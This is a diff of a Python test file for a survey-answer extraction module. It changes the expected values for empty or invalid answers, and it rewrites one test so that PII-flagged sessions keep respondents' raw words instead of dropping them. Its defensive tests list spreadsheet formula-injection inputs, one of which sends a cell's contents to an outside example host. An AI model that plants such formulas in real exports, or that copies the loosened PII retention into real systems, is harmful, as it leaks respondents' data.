@@ -141,7 +141,7 @@ def test_placeholders_in_another_language_are_config_not_code():
     assert default_field.status == "extracted"                       # the built-in list is English only
     config = _config(placeholders=["नहीं पता", "n/a"])
     field = _by_name(fx.parse_model_response(answer, config))["district"]
-    assert (field.status, field.value, field.raw_value) == ("not_provided", None, None)
+    assert (field.status, field.value, field.raw_value) == ("not_provided", "Not answered", None)
 
 
 def test_the_placeholders_list_replaces_the_built_in_one():
@@ -179,7 +179,7 @@ def test_a_sensitive_field_does_not_store_the_respondents_words_unless_store_raw
 def test_an_unmapped_sensitive_answer_keeps_its_status_but_not_the_words():
     answer = _answer(disability={"value": "sometimes", "raw": "my son sometimes cannot hear"})
     field = _by_name(fx.parse_model_response(answer, _config()))["disability"]
-    assert (field.status, field.value, field.raw_value) == ("unmapped", None, None)
+    assert (field.status, field.value, field.raw_value) == ("unmapped", "Invalid response", None)
 
 
 def test_store_raw_must_be_a_boolean_and_can_switch_raw_off_for_a_plain_field():
@@ -191,15 +191,16 @@ def test_store_raw_must_be_a_boolean_and_can_switch_raw_off_for_a_plain_field():
     assert (field.value, field.raw_value) == ("Mysuru", None)
 
 
-def test_a_pii_flagged_session_keeps_no_respondent_words():
+def test_a_pii_flagged_session_keeps_everything_it_extracted():
+    """The flag marks the session; the data stays in our system and the export query decides what to leave out."""
     rows = [_row(1, "Your district?", answer=False), _row(2, "Mysuru, call me on 9876543210")]
     answer = _answer(district={"value": "Mysuru", "raw": "Mysuru, call me"}, gender={"value": "Female", "raw": "girl"},
                      income={"value": "Low", "raw": "we earn 2 lakh"}, age={"value": 1, "raw": "1"})
     run = fx.extract(rows, _config(), SYSTEM, USER, lambda prompt: (answer, {}))
     assert run.result.pii_detected is True                          # forced by the pre-check, the model said false
     fields = _by_name(run.result)
-    assert all(f.raw_value is None for f in run.result.fields)                                        # every field
-    assert fields["district"].value is None and fields["district"].status == "extracted"              # free text: value gone
+    assert fields["district"].raw_value == "Mysuru, call me" and fields["gender"].raw_value == "girl"   # the words are kept
+    assert fields["district"].value == "Mysuru" and fields["district"].status == "extracted"          # free text: value kept
     assert fields["gender"].value == "Female" and fields["age"].value == "1" and fields["income"].value == "Low"
 
 
@@ -215,7 +216,7 @@ def test_a_session_that_is_not_flagged_keeps_its_values_and_words():
 @pytest.mark.parametrize("value", ['=HYPERLINK("http://example.org/"&A1,"x")', "+1+1", "-2+3", "@SUM(1+1)"])
 def test_a_free_text_value_that_a_spreadsheet_would_run_is_not_stored_as_a_value(value):
     field = _by_name(fx.parse_model_response(_answer(district={"value": value, "raw": None}), _config()))["district"]
-    assert field.status == "unmapped" and field.value is None
+    assert field.status == "unmapped" and field.value == "Invalid response"
     assert field.raw_value == "'" + value                           # kept for review, neutralised for export
 
 
@@ -231,7 +232,7 @@ def test_raw_text_with_a_formula_prefix_is_neutralised_and_other_text_is_untouch
 def test_a_boolean_is_never_an_integer_even_when_the_range_would_hold_it():
     for value in (True, False):
         field = _by_name(fx.parse_model_response(_answer(age={"value": value, "raw": None}), _config()))["age"]
-        assert (field.status, field.value) == ("unmapped", None)
+        assert (field.status, field.value) == ("unmapped", "Invalid response")
         assert field.raw_value == ("true" if value else "false")
     field = _by_name(fx.parse_model_response(_answer(age={"value": 1, "raw": None}), _config()))["age"]
     assert (field.status, field.value) == ("extracted", "1")          # a real 1 is fine
